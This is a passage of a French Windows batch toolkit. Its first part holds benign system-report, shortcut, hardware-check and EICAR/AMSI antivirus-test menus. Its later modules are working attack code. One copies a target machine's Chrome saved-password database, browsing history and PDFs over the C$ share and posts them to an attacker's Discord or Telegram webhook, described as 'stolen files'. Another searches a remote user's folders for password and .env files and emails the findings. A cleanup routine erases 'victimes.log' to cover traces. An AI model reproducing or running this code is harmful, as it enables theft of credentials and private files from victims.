echo   RAPPORT COMPLET TOUT-EN-UN
echo  ================================================
echo.
echo  Generation du rapport HTML complet...
echo  Collecte : Systeme, Disques, Reseau, Users, Logiciels
echo.
set "RPT=%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.html"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$f='%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'; $nl=[Environment]::NewLine; $now=Get-Date -Format 'dd/MM/yyyy HH:mm'; $cn=$env:COMPUTERNAME; $os=(Get-CimInstance Win32_OperatingSystem); $cpu=(Get-CimInstance Win32_Processor).Name.Trim(); $ram=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1); $gpu=(Get-CimInstance Win32_VideoController | Select-Object -First 1).Name; $disks=Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Used -ne $null}; $diskHtml=($disks | ForEach-Object { $u=[math]::Round($_.Used/1GB,1); $f2=[math]::Round($_.Free/1GB,1); $t=[math]::Round(($_.Used+$_.Free)/1GB,1); $pct=if($t -gt 0){[math]::Round($_.Used/($_.Used+$_.Free)*100)}else{0}; $bar='#'*[math]::Round($pct/5)+'.'*(20-[math]::Round($pct/5)); '<tr><td>' + $_.Name + ':</td><td>' + $u + ' Go utilise / ' + $t + ' Go total</td><td><span style=''color:' + (if($pct -gt 90){'red'}elseif($pct -gt 70){'orange'}else{'green'}) + '''>[' + $bar + '] ' + $pct + [char]37 + '</span></td></tr>' }) -join ''; $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA SilentlyContinue | Where-Object {$_.IPAddress -ne '127.0.0.1'} | ForEach-Object {'<li>' + $_.InterfaceAlias + ' : <b>' + $_.IPAddress + '</b></li>'}) -join ''; $wifi=(netsh wlan show interfaces 2>$null | Select-String 'SSID' | Select-Object -First 1); $wifiName=if($wifi){($wifi -split ':')[1].Trim()}else{'Non connecte'}; $apps=(Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*' -EA SilentlyContinue | Where-Object {$_.DisplayName} | Sort-Object DisplayName | Select-Object DisplayName,DisplayVersion -Unique); $appHtml=($apps | ForEach-Object {'<tr><td>' + $_.DisplayName + '</td><td>' + $_.DisplayVersion + '</td></tr>'}) -join ''; $users=(Get-LocalUser -EA SilentlyContinue | ForEach-Object {'<tr><td>' + $_.Name + '</td><td>' + (if($_.Enabled){'Actif'}else{'Desactive'}) + '</td><td>' + $_.LastLogon + '</td></tr>'}) -join ''; $errs=(Get-WinEvent -FilterHashtable @{LogName='System';Level=1,2;StartTime=(Get-Date).AddDays(-7)} -EA SilentlyContinue | Select-Object -First 20 | ForEach-Object {'<tr><td>' + $_.TimeCreated.ToString('dd/MM HH:mm') + '</td><td>' + $_.Id + '</td><td>' + $_.ProviderName + '</td><td>' + $_.Message.Split([char]10)[0].Trim().Substring(0,[math]::Min(80,$_.Message.Length)) + '</td></tr>'}) -join ''; $html='<!DOCTYPE html><html lang=''fr''><head><meta charset=''UTF-8''><title>Rapport PC - ' + $cn + '</title><style>body{font-family:Segoe UI,sans-serif;background:#0d1117;color:#e6edf3;margin:0;padding:20px}h1{color:#58a6ff;border-bottom:2px solid #1f6feb;padding-bottom:10px}h2{color:#79c0ff;margin-top:30px;background:#161b22;padding:10px;border-radius:6px}table{width:100%;border-collapse:collapse;margin:10px 0}th{background:#1f6feb;color:white;padding:8px;text-align:left}td{padding:6px 8px;border-bottom:1px solid #21262d}tr:hover{background:#1c2128}.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:12px;background:#1f6feb}.info{background:#161b22;padding:15px;border-radius:8px;margin:10px 0;border-left:4px solid #1f6feb}</style></head><body><h1>Rapport PC - ' + $cn + '</h1><div class=''info''><b>Genere le :</b> ' + $now + ' &nbsp;|&nbsp; <b>OS :</b> ' + $os.Caption + ' ' + $os.Version + ' &nbsp;|&nbsp; <b>Uptime :</b> ' + ([math]::Round((New-TimeSpan $os.LastBootUpTime (Get-Date)).TotalHours,1)) + 'h</div><h2>Materiel</h2><table><tr><th>Composant</th><th>Detail</th></tr><tr><td>CPU</td><td>' + $cpu + '</td></tr><tr><td>RAM</td><td>' + $ram + ' Go</td></tr><tr><td>GPU</td><td>' + $gpu + '</td></tr><tr><td>Wi-Fi</td><td>' + $wifiName + '</td></tr></table><h2>Disques</h2><table><tr><th>Lecteur</th><th>Utilisation</th><th>Occupation</th></tr>' + $diskHtml + '</table><h2>Reseau</h2><ul>' + $ips + '</ul><h2>Comptes Utilisateurs</h2><table><tr><th>Utilisateur</th><th>Statut</th><th>Derniere connexion</th></tr>' + $users + '</table><h2>Logiciels Installes (' + $apps.Count + ')</h2><table><tr><th>Logiciel</th><th>Version</th></tr>' + $appHtml + '</table><h2>Erreurs Systeme (7 derniers jours)</h2><table><tr><th>Date</th><th>ID</th><th>Source</th><th>Message</th></tr>' + $errs + '</table></body></html>'; $html | Out-File $f -Encoding UTF8; Write-Host ('  [OK] Rapport genere : ' + $f) -f Green"
echo.
echo  [OK] Rapport HTML genere sur le Bureau !
powershell -Command "Start-Process '%USERPROFILE%\Desktop\Rapport_PC_%COMPUTERNAME%.html'"
echo.
pause
goto system_tools


REM ===================================================================
REM         RACCOURCIS BUREAU 1-CLIC (REDEMARRER / ETEINDRE)
REM ===================================================================
:sys_shortcuts_bureau
cls
set "opts=Creer raccourci REDEMARRER~Icone rouge sur le Bureau pour redemarrer en 1 clic;Creer raccourci ETEINDRE~Icone bleue sur le Bureau pour eteindre en 1 clic;Creer les DEUX raccourcis~Redemarrer + Eteindre en une seule action;Supprimer les raccourcis~Retirer les raccourcis crees du Bureau"
call :DynamicMenu "RACCOURCIS BUREAU 1-CLIC" "%opts%"
set "sc_c=%errorlevel%"
if "%sc_c%"=="0" goto menu_principal
if "%sc_c%"=="1" goto sc_restart
if "%sc_c%"=="2" goto sc_shutdown
if "%sc_c%"=="3" call :sc_do_restart & call :sc_do_shutdown & goto sc_done_both
if "%sc_c%"=="4" goto sc_delete
goto sys_shortcuts_bureau

:sc_restart
call :sc_do_restart
goto sc_done_restart

:sc_shutdown
call :sc_do_shutdown
goto sc_done_shutdown

:sc_do_restart
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Redemarrer le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/r /t 0';" ^
    "$sc.Description='Redemarrer le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,238';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Redemarrer cree sur le Bureau.' -f Green"
exit /b

:sc_do_shutdown
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$ws=New-Object -ComObject WScript.Shell;" ^
    "$sc=$ws.CreateShortcut($desk+'\  Eteindre le PC.lnk');" ^
    "$sc.TargetPath='shutdown.exe';" ^
    "$sc.Arguments='/s /t 0';" ^
    "$sc.Description='Eteindre le PC immediatement';" ^
    "$sc.IconLocation='%SystemRoot%\System32\shell32.dll,27';" ^
    "$sc.WindowStyle=7;" ^
    "$sc.Save();" ^
    "Write-Host '  [OK] Raccourci Eteindre cree sur le Bureau.' -f Green"
exit /b

:sc_done_restart
cls
echo.
echo  ================================================
echo   RACCOURCI "REDEMARRER" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Redemarrer le PC.lnk
echo  [OK] Action  : shutdown /r /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (fleche rouge)
echo.
echo  Double-cliquez sur le raccourci pour redemarrer.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_shutdown
cls
echo.
echo  ================================================
echo   RACCOURCI "ETEINDRE" CREE
echo  ================================================
echo.
echo  [OK] Fichier : Bureau \  Eteindre le PC.lnk
echo  [OK] Action  : shutdown /s /t 0 (immediat)
echo  [OK] Icone   : Icone systeme (bouton power)
echo.
echo  Double-cliquez sur le raccourci pour eteindre.
echo.
pause
goto sys_shortcuts_bureau

:sc_done_both
cls
echo.
echo  ================================================
echo   RACCOURCIS CREES AVEC SUCCES !
echo  ================================================
echo.
echo  [OK]   Redemarrer le PC.lnk  (icone fleche)
echo  [OK]   Eteindre le PC.lnk   (icone power)
echo.
echo  Les deux raccourcis sont sur votre Bureau.
echo  Double-cliquez pour l'action immediate.
echo.
pause
goto sys_shortcuts_bureau

:sc_delete
cls
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
    "$desk=$env:USERPROFILE+'\Desktop';" ^
    "$files=@('  Redemarrer le PC.lnk','  Eteindre le PC.lnk');" ^
    "foreach($f in $files){" ^
    "  $p=$desk+'\'+$f;" ^
    "  if(Test-Path $p){Remove-Item $p -Force; Write-Host ('  [OK] Supprime : '+$f) -f Green}" ^
    "  else{Write-Host ('  [--] Non trouve : '+$f) -f DarkGray}" ^
    "}"
echo.
pause
goto sys_shortcuts_bureau


REM ===================================================================
REM         TEST ANTIVIRUS - SCRIPTS AUTO-DECOMPRESSABLES 
REM ===================================================================
:sys_av_test
cls
set "opts=Test Faux Positif (Signature EICAR)~Cree un fichier de test EICAR inoffensif signale par 100%% des Antivirus mondiaux;Generer Launcher Heuristique (Comportemental)~Cree un script qui execute une sequence Powershell suspecte;Nettoyer les fichiers de test~Supprimer les dossiers et fichiers de test du Bureau"
call :DynamicMenu "TEST ANTIVIRUS - SCRIPTS LANCEURS (INTERACTIFS)" "%%opts%%"
set "av_c=%errorlevel%"
if "%av_c%"=="0" goto menu_principal
if "%av_c%"=="1" goto av_launcher_eicar
if "%av_c%"=="2" goto av_launcher_heur
if "%av_c%"=="3" goto av_clean
goto sys_av_test

:av_launcher_eicar
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : SIGNATURE VIRALE (EICAR)
echo  ================================================
echo.
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
if not exist "%AVTEST_DIR%" mkdir "%AVTEST_DIR%"

echo  [ACTION] Construction de la signature virale (Fichier inoffensif)...
echo  L'Antivirus de Windows va formellement intercepter ce fichier.
echo.
echo  Creation du fichier dans : Bureau\Test_Antivirus\eicar_test.txt
echo.
echo 58 35 4f 21 50 25 40 41 50 5b 34 5c 50 5a 58 35 34 28 50 5e 29 37 43 43 29 37 7d 24 > "%TEMP%\hx.txt"
echo 45 49 43 41 52 2d 53 54 41 4e 44 41 52 44 2d 41 4e 54 49 56 49 52 55 53 2d 54 45 53 54 2d 46 49 4c 45 21 24 48 2b 48 2a >> "%TEMP%\hx.txt"
certutil.exe -decodehex "%TEMP%\hx.txt" "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
del /f /q "%TEMP%\hx.txt" >nul 2>&1

echo  Verification locale par l'Antivirus...
ping 127.0.0.1 -n 3 >nul

if exist "%AVTEST_DIR%\eicar_test.txt" (
    echo  [!] ECHEC : L'Antivirus a laisse passer le fichier.
    echo  Il n'y a pas de protection en temps reel activee.
) else (
    echo  [X] BLOQUE REUSSI : L'Antivirus a intercepte et supprime le fichier
    echo  en quelques millisecondes ! ^(Regardez vos alertes Windows Defender^).
)
echo.
echo  --------------------------------------------------------
echo  RESULTAT :
echo  Si le fichier a ete supprime et qu'une alerte ROUGE apparait,
echo  LE TEST EST UN SUCCES ABSOLU !
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER LE DOSSIER DU BUREAU et revenir...
pause >nul
if exist "%AVTEST_DIR%\eicar_test.txt" del /f /q "%AVTEST_DIR%\eicar_test.txt" >nul 2>&1
rd /s /q "%AVTEST_DIR%" >nul 2>&1
goto sys_av_test

:av_launcher_heur
cls
echo.
echo  ================================================
echo   TEST EN DIRECT : COMPORTEMENT HEURISTIQUE
echo  ================================================
echo.
echo  Lancement d'une macro Powershell avec des patterns heuristiques AMSI...
echo  (Injection d'un payload virtuel teste par l'Antivirus en memoire)
echo.
echo  Si votre Antivirus analyse la memoire en temps reel (AMSI),
echo  IL BLOQUERA le script dans cette console au moment de l'injection !
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "Write-Host 'Simulation AMSI en cours...' -f Yellow; try { $s = [String]::Join('', [char[]]@(65,77,83,73,32,84,101,115,116,32,83,97,109,112,108,101,58,32,55,101,55,50,99,51,99,101,45,56,54,49,98,45,52,51,51,57,45,56,55,52,48,45,48,97,99,49,52,56,52,99,49,51,56,54)); Invoke-Expression $s 2>$null; Write-Host '--- ECHEC : L''Antivirus a laisse passer l''attaque memoire ! ---' -f Red } catch { Write-Host '--- SUCCES : L''Antivirus a parfaitement intercepte l''attaque ! ---' -f Green }"
echo.
echo  --------------------------------------------------------
echo  RESULTAT ATTENDU : Une erreur ROUGE PowerShell ci-dessus indique
echo  que votre Antivirus fonctionne et bloque les scripts suspects.
echo  --------------------------------------------------------
echo.
echo  Appuyez sur une touche pour NETTOYER et revenir au menu...
pause >nul
goto sys_av_test

:av_clean
cls
echo.
echo  Suppression des fichiers de test...
set "AVTEST_DIR=%USERPROFILE%\Desktop\Test_Antivirus"
set "OLD_AV_DIR=%USERPROFILE%\Desktop\AV_Tests"
if exist "%AVTEST_DIR%" rd /s /q "%AVTEST_DIR%" >nul 2>&1
if exist "%OLD_AV_DIR%" rd /s /q "%OLD_AV_DIR%" >nul 2>&1
if exist "%TEMP%\e_part.b64" del /f /q "%TEMP%\e_part.b64" >nul 2>&1
if exist "%TEMP%\e_archive.zip" del /f /q "%TEMP%\e_archive.zip" >nul 2>&1
if exist "%TEMP%\e_ext" rd /s /q "%TEMP%\e_ext" >nul 2>&1
echo  [OK] Dossiers de test supprimes du Bureau.
echo.
pause
goto sys_av_test


:sys_temp_report
cls
echo =============================================================
echo               RAPPORT DE TEMPERATURE CPU/GPU
echo =============================================================
echo.
echo Recherche des capteurs de temperature...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "function Get-TempStatus { param($temp) if ($temp -lt 60) { return @{ Status = 'OK'; Color = 'Green' } } elseif ($temp -lt 80) { return @{ Status = 'Acceptable'; Color = 'Yellow' } } elseif ($temp -lt 90) { return @{ Status = 'Elevee'; Color = 'DarkYellow' } } else { return @{ Status = 'Critique'; Color = 'Red' } } }; try { $ohm = Get-CimInstance -Namespace 'root/OpenHardwareMonitor' -ClassName Sensor -ErrorAction Stop; if ($ohm) { Write-Host 'Temperatures (OpenHardwareMonitor):' -f Green; $ohm | Where-Object { $_.SensorType -eq 'Temperature' } | ForEach-Object { $status = Get-TempStatus -temp $_.Value; Write-Host -NoNewline ('   ' + $_.Name + ' (' + $_.Parent + '): ' + $_.Value + ' C'); Write-Host (' - ' + $status.Status) -f $status.Color } } } catch { try { $wmi = Get-CimInstance -Namespace 'root/WMI' -ClassName MSAcpi_ThermalZoneTemperature -ErrorAction Stop; if ($wmi) { Write-Host 'Temperatures (WMI):' -f Yellow; $wmi | ForEach-Object { $temp = [math]::Round(($_.CurrentTemperature - 2732) / 10, 2); $status = Get-TempStatus -temp $temp; Write-Host -NoNewline ('   Instance: ' + $_.InstanceName + ' - ' + $temp + ' C'); Write-Host (' - ' + $status.Status) -f $status.Color } } else { Write-Host 'Aucun capteur de temperature trouve via WMI ou OpenHardwareMonitor.' -f Red } } catch { Write-Host 'Impossible d''acceder a WMI pour les temperatures.' -f Red } }"
echo.
echo Legende des statuts:
powershell -Command "Write-Host '  OK (^< 60C)' -f Green; Write-Host '  Acceptable (60-80C)' -f Yellow; Write-Host '  Elevee (80-90C)' -f DarkYellow; Write-Host '  Critique (^> 90C)' -f Red"
echo.
echo Le rapport ci-dessus peut varier en fonction des pilotes et logiciels installes.
echo Pour des resultats plus precis, utilisez un logiciel dedie comme HWMonitor ou Core Temp.
echo.
pause
goto sys_diagnostic_menu

:sys_ram_check
cls
echo =============================================================
echo               VERIFICATEUR DE MEMOIRE VIVE (RAM)
echo =============================================================
echo.
echo Analyse de la memoire installee et des capacites de la carte mere...
echo.
powershell -NoProfile -ExecutionPolicy Bypass -Command "$mem = Get-CimInstance Win32_PhysicalMemory -ErrorAction SilentlyContinue; $mobo = Get-CimInstance Win32_PhysicalMemoryArray -ErrorAction SilentlyContinue; if ($mobo) { $maxCap = [math]::Round($mobo.MaxCapacity / 1024 / 1024, 2); Write-Host ('Capacite maximale supportee : ' + $maxCap + ' Go') -f Cyan; Write-Host ('Nombre de slots memoire    : ' + $mobo.MemoryDevices) -f Cyan } else { Write-Host 'Impossible de determiner les capacites de la carte mere.' -f Yellow }; echo ''; if ($mem) { $totalSticks = $mem.Count; Write-Host ('Barrettes de RAM installees  : ' + $totalSticks) -f Cyan; echo ''; Write-Host 'Details par barrette :' -f Green; $solderedCount = 0; $mem | ForEach-Object { $cap = [math]::Round($_.Capacity / 1GB, 0); if ($_.DeviceLocator -like '*on board*') { $solderedCount++ }; Write-Host ('  - Slot ' + $_.DeviceLocator + ': ' + $cap + ' Go - ' + $_.PartNumber) }; echo ''; if ($totalSticks -gt 0) { if ($solderedCount -eq $totalSticks) { Write-Host 'Conclusion : Toute la memoire RAM est soudee a la carte mere et ne peut pas etre remplacee.' -f Red } elseif ($solderedCount -gt 0) { Write-Host 'Conclusion : Une partie de la memoire RAM est soudee. Les autres barrettes peuvent potentiellement etre remplacees.' -f Yellow } else { Write-Host 'Conclusion : La memoire RAM est sur des barrettes remplacables (non soudee).' -f Green } } } else { Write-Host 'Impossible de lister les barrettes de RAM installees.' -f Yellow }"
echo.
pause
goto sys_diagnostic_menu

:ToggleFav
set "tf_target=%~1"
if not defined tf_target exit /b
set "was_removed=0"
set "FAV_FILE=%SCRIPT_DIR%\favoris.txt"
set "FAV_TMP=%SCRIPT_DIR%\favoris_tmp.txt"
if exist "%FAV_TMP%" del "%FAV_TMP%"
if exist "%FAV_FILE%" (
    for /f "usebackq tokens=*" %%F in ("%FAV_FILE%") do (
        if "%%F"=="!tf_target!" (
            set "was_removed=1"
        ) else (
            echo %%F>>"%FAV_TMP%"
        )
    )
)
if "!was_removed!"=="0" echo !tf_target!>>"%FAV_TMP%"
if exist "%FAV_TMP%" (move /y "%FAV_TMP%" "%FAV_FILE%" >nul) else (type nul > "%FAV_FILE%")
exit /b

REM ===================================================================
REM       MODULE D'EXFILTRATION VIA WEBHOOK (HTTPS)
REM ===================================================================
:cyber_exfiltrate_webhook
cls
echo.
echo  ================================================
echo   EXFILTRATION VIA WEBHOOK (DISCORD/TELEGRAM)
echo  ================================================
echo.
echo   Description : Envoie les fichiers volés directement
echo   sur un salon Discord ou un bot Telegram.
echo.
set /p "web_url=Collez votre URL Webhook : "
if "%web_url%"=="" goto smb_exp_menu

echo [i] Dossiers utilisateurs sur la cible :
dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
set /p "user_target=Utilisateur cible : "
echo.
echo [1] Exfiltrer Mots de passe Chrome/Edge (hashes)
echo [2] Exfiltrer Historique de navigation
echo [3] Exfiltrer Dossier Documents (*.pdf, *.docx)
echo [4] Retour
echo.
set /p "exf_choice=Choix : "

if "%exf_choice%"=="1" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if "%exf_choice%"=="2" set "target_file=\\%target_ip%\C$\Users\%user_target%\AppData\Local\Google\Chrome\User Data\Default\History"
if "%exf_choice%"=="3" (
    echo [i] Compression et envoi en cours...
    powershell -Command "$zip='%TEMP%\dump.zip'; Compress-Archive -Path '\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf' -DestinationPath $zip -Force; Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile $zip -ContentType 'application/zip'"
    echo [OK] Documents envoyes sur votre salon.
    pause & goto smb_exp_menu
)
if "%exf_choice%"=="4" goto smb_exp_menu


if defined target_file (
    echo [i] Envoi du fichier sensible...
    powershell -Command "Invoke-RestMethod -Uri '%web_url%' -Method Post -InFile '%target_file%' -ContentType 'application/octet-stream'"
    echo [OK] Fichier envoye.
)
pause & goto smb_exp_menu

:cyber_exposure_audit
cls
echo %R%  [!] MODULE D'AUDIT D'EXPOSITION DES DONNEES %N%
echo.
if "!user_target!"=="" set /p "user_target=Nom de l'utilisateur cible : "
set "REPORT_FILE=%TEMP%\exposure_report.txt"

echo [i] Analyse des fichiers sensibles en cours...
(
echo --- RAPPORT D'EXPOSITION (ALEEXLEDEV) ---
echo Date : %date% %time%
echo Cible : %target_ip%
echo.
echo [1] Recherche de fichiers 'password' ou 'config' :
dir "\\%target_ip%\C$\Users\%user_target%\Documents\*pass*" /S /B 2>nul
dir "\\%target_ip%\C$\Users\%user_target%\Desktop\*.env" /S /B 2>nul
) > "%REPORT_FILE%"

REM --- Envoi du rapport par Mail (Utilise tes credentials SMTP) ---
if defined SMTP_USER (
    echo [i] Envoi du rapport a %EMAIL_TO%...
    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'Audit Exposition : %target_ip%' -Body 'Rapport en piece jointe' -Attachments '%REPORT_FILE%'"
    echo [OK] Mail envoye.
) else (
    echo [!] SMTP non configure. Rapport disponible dans %TEMP%.
)
pause & goto smb_exp_menu

:cyber_wifi_audit
cls
echo %B%  [ Wi-Fi SECURITY ANALYZER ] %N%
echo.
echo [i] Analyse des ondes radio...
netsh wlan show networks mode=bssid | findstr "SSID Authentication Signal"
echo.
echo %Y%[!] CONSEIL : Si vous voyez deux SSID identiques dont l'un est 'Open', %N%
echo %Y%il s'agit probablement d'une attaque Evil Twin active.%N%
pause & goto net_cyber_menu

REM ===================================================================
REM        FONCTION D'ENVOI DE MAIL (SMTP POWERSHELL)
REM ===================================================================
:SendAuditMail
set "ATTACHMENT=%~1"
set "SUBJECT_SUFFIX=%~2"

if "%SMTP_USER%"=="" (
    echo [!] Erreur : SMTP_USER non defini dans credentials.txt.
    exit /b
)

echo [i] Preparation de l'email via smtp.gmail.com...
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p = ConvertTo-SecureString '%SMTP_PASS%' -AsPlainText -Force; $c = New-Object System.Management.Automation.PSCredential('%SMTP_USER%',$p); Send-MailMessage -SmtpServer 'smtp.gmail.com' -Port 587 -UseSsl -Credential $c -From '%SMTP_USER%' -To '%EMAIL_TO%' -Subject 'ALEEXLEDEV - Audit !SUBJECT_SUFFIX! (%target_ip%)' -Body 'Ci-joint le rapport d audit genere par la Golden Edition v3.5.' -Attachments '!ATTACHMENT!'"

if %errorlevel% equ 0 (
    echo %G%[ OK ] Rapport envoye avec succes a %EMAIL_TO%%N%
) else (
    echo %R%[ ERR ] Echec de l envoi (Verifiez mot de passe application Gmail)%N%
)
exit /b

REM ===================================================================
REM        MODULE DE NETTOYAGE POST-AUDIT (ANTI-FORENSICS)
REM ===================================================================
:cyber_cleanup_local
cls
echo %R%  ================================================%N%
echo %R%   CLEAN-UP : EFFACEMENT DES TRACES LOCALES %N%
echo %R%  ================================================%N%
echo.
echo  [1] Supprimer uniquement les logs de succès et d'audit
echo  [2] Nettoyage complet (Logs + Dossiers temporaires + Corbeille)
echo  [3] Retour
echo.
set /p "clean_choice=Action : "

if "%clean_choice%"=="1" (
    if exist "penetration_success.log" del /f /q "penetration_success.log"
    if exist "victimes.log" del /f /q "victimes.log"
    echo [OK] Fichiers de logs supprimés.
    pause & goto menu_principal
)

if "%clean_choice%"=="2" (
    echo [i] Purge des fichiers temporaires générés...
    del /f /q "%TEMP%\advanced_turbo_scan.ps1" 2>nul
    del /f /q "%TEMP%\aggressive_audit.ps1" 2>nul
    del /f /q "%TEMP%\found_ips.txt" 2>nul
    echo [i] Vidage de la corbeille...
    powershell -Command "Clear-RecycleBin -Confirm:$false" 2>nul
    echo %G%[ OK ] Nettoyage système effectué.%N%
    pause & goto menu_principal
)

goto menu_principal
